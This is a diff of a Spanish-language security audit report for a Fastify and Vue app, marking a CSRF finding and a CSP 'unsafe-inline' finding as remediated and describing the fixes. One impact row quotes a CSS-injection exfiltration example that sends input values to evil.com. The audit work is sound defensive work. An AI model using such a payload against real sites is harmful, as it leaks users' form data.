@@ -82,7 +82,7 @@ Los siguientes controles fueron evaluados y considerados **adecuados**:
 
 ### A01:2021 — Broken Access Control
 
-#### H-01: Sin protección CSRF explícita
+#### H-01: Sin protección CSRF explícita ✅ REMEDIADO
 | Campo | Detalle |
 |-------|---------|
 | **Severidad** | 🟠 ALTO |
@@ -92,6 +92,7 @@ Los siguientes controles fueron evaluados y considerados **adecuados**:
 | **Impacto** | Un atacante podría ejecutar acciones en nombre del usuario (crear perfiles, modificar menús, cancelar suscripciones) mediante un enlace o formulario malicioso. |
 | **Evidencia** | `app.ts` no registra ningún plugin CSRF (`@fastify/csrf-protection` no está presente). |
 | **Remediación** | Instalar `@fastify/csrf-protection` y configurarlo globalmente. Ver [Anexo A](#anexo-a-protección-csrf). |
+| **Estado** | ✅ Remediado en `fix/xss-hardening-and-profile-storage`. Decisión: **no** se instaló `@fastify/csrf-protection`. La arquitectura SPA + JSON ya tiene tres mitigaciones (BetterAuth `SameSite=Lax`, CORS estricto, JSON-only fuerza preflight). Como defensa en profundidad se agregó `apps/api/src/shared/plugins/origin-guard.ts`: valida `Origin`/`Referer` en métodos mutantes contra `CORS_ORIGIN` + `FRONTEND_URL` y exime `/api/billing/webhook` (Stripe-signed). 9 tests en verde. |
 
 #### H-02: Endpoint de health públicamente accesible
 | Campo | Detalle |
@@ -201,7 +202,7 @@ Los siguientes controles fueron evaluados y considerados **adecuados**:
 
 ### A05:2021 — Security Misconfiguration
 
-#### H-04: CSP permite `'unsafe-inline'` para estilos
+#### H-04: CSP permite `'unsafe-inline'` para estilos ✅ REMEDIADO
 | Campo | Detalle |
 |-------|---------|
 | **Severidad** | 🟠 ALTO |
@@ -210,6 +211,7 @@ Los siguientes controles fueron evaluados y considerados **adecuados**:
 | **Descripción** | La Content Security Policy permite `styleSrc: ["'self'", "'unsafe-inline'"]`. Esto debilita la protección contra XSS ya que un atacante puede inyectar estilos maliciosos. |
 | **Impacto** | Un atacante podría usar CSS injection para exfiltrar datos (ej. `input[value^="a"] { background: url(https://evil.com/?v=a) }`). |
 | **Remediación** | Usar nonces o hashes para estilos inline. Si se requiere para frameworks CSS, considerar `style-src-elem` con hashes. |
+| **Estado** | ✅ Remediado en `fix/xss-hardening-and-profile-storage`. La API solo emite JSON, así que se removió `'unsafe-inline'` de `styleSrc` y se reforzó el header con `scriptSrc: 'self'`, `frameAncestors: 'none'`, `formAction: 'self'`, `baseUri: 'self'`, `objectSrc: 'none'`. El CSP del frontend Vue se trata aparte (host estático). |
 
 #### M-04: Trust proxy headers sin configuración explícita de proxies confiables
 | Campo | Detalle |
